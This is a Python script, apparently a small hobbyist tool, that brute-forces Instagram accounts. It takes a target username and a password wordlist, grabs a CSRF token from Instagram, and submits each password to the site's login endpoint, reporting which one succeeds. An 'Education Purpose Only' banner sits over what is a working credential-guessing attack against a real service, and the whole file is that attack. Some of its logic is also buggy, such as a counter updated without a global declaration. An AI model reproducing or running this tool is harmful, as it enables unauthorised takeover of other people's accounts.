try:
	import urllib.request
	import urllib.parse
	import requests
	import json
	import os
	import time
	from colorama import *
except:
	os.system("python3 -m pip install colorama")
	os.system("cls")
	from colorama import *



init()

banner = '''
+++++++++++++++++++++++++++++++++++++++++
+	 [*] InstaGram Brute Force \t+
+		    Prayag Piya \t+
+	 [*] Education Purpose Only  \t+
+  [*] Email: prayagpiya12@gmail.com \t+
+				\t+
+				\t+
+++++++++++++++++++++++++++++++++++++++++
'''

print(Fore.BLUE + banner)

BASE_URL = "https://www.instagram.com/"
LOGIN_URL = BASE_URL + 'accounts/login/ajax/'
USERNAME = input(Fore.GREEN+"[*] Enter Username or Email:- ")
PASSWD =  input(Fore.GREEN+"[*] WordList Dir (Default Password List Has Set) :- ")
USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36'
file_path = os.path.join('pass.txt')
print(file_path)
print(Fore.GREEN + "[*] Loading Wordlist be patient")
time.sleep(3)
count = 0
user_error = 0
session = requests.Session()
session.headers = {'user-agent':USER_AGENT}
session.headers.update({'Referer':BASE_URL})

req = session.get(BASE_URL)
if len(file_path) == 8:
	pass
else:
	try:
		file_path = os.path.join(PASSWD)
		print(Fore.GREEN + "[*] Loading Wordlist be patient")
		time.sleep(3)
	except Exception as e:
		print("No Such File found in dir")	

def logger(username, password):
	session.headers.update({'X-CSRFToken':req.cookies['csrftoken']})
	login_data = {'username':username, 'password':password}
	login = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
	session.headers.update({'X-CSRFToken': login.cookies['csrftoken']})
	cookies = login.cookies
	login_text = json.loads(login.text)
	if login_text['user']==True:
		if login_text['authenticated'] == False:
			print(Fore.RED+"[*] {} Trying Failed : {}".format(count, password))
			print(login_text)
		else:
			print(Fore.GREEN+"[*] Login Successful : {}".format(password))
			print(login_text)
	else:
		print(Fore.RED+"[*] No Such User : {}".format(USERNAME))
		user_error = user_error + 1


with open(file_path, 'r') as passwords:
	try:
		for i in passwords:
			logger(USERNAME, i)
			if user_error == 1:
				break
			count = count + 1
	except:
		print("")
